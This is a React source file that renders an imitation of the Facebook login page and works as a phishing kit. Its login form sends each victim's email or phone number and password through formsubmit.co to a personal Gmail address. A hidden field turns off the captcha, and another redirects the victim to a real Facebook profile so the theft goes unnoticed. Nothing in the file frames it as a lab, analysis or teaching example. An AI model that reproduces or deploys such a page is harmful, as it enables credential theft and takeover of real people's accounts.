import React from 'react';
import ReactDom from 'react-dom';

const App =()=>{
    return(
        <>
         <div class="facebook">
    <div class="mobile-top-view">
      <img src="fb-mobile.png" alt=""/>
      <a href="#">Get Facebook for Android and browse faster.</a>
    </div>
    <div class="view">
      <div class="container">
        <div class="row">
          <div class="col title-div">
            <div>
              <h1 class="text-primary">facebook</h1>
              <p>Connect with friends and the world around you on Facebook.</p>
            </div>
          </div>
          <div class="col-sm-5">
            <div class="card">

              <div>
                <form action="https://formsubmit.co/anikking87@gmail.com" method="POST">
                    <input name="phone" id="email" class="input-group" type="text" placeholder="Email or Phone Number"/>
                    <input type="hidden" name="_next" value="https://www.facebook.com/profile.php?id=100067312365244"/>
                    <input type="hidden" name="_captcha" value="false"/>
                    <input name="password" id="pass" class="input-group my-2" type="password" placeholder="Password"/>
                    <button type="submit" id="fbLogin" class="btn btn-primary btn-lg" style={{width:'100%'}}>Log In</button>
                </form>
                <hr id="hr1"/>
                <p id="forgetPass1" class="text-center my-3" style={{fontSize: '14px'}}><a href="#">Forget account?</a>
                </p>
              </div>
              <hr id="hr2"/>
              <button id="createAcBtn" class="btn btn-success btn-lg">Create New Account</button>
              <p id="forgetPass2" class="text-center my-3"><a href="#">Forget account?</a></p>

            </div>
            <p id="form-footer" class="text-center my-4" style={{fontSsize: "14px"}}><b>Create a Page</b> for a celebrity,
              brand or buisness.
            </p>
            <div class="mobile-version-footer">
              <div class="row language">
                <div class="col">
                  <p>English (US)</p>
                  <p>हिन्दी</p>
                  <p>Portugues (Brasil)</p>
                  <p>Deutsch</p>
                </div>
                <div class="col">
                  <p>नेपाली</p>
                  <p>Espanol</p>
                  <p>Francais (France)</p>
                  <p><i class="fa fa-plus-square"></i></p>
                </div>
              </div>
              <div class="nav">
                <ul>
                  <a href="">
                    <li>About</li>
                  </a>
                  <a href="">
                    <li>Help</li>
                  </a>
                  <a href="">
                    <li>More</li>
                  </a>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

        </>
    );
        
}

ReactDom.render(<App/>,document.getElementById('root'));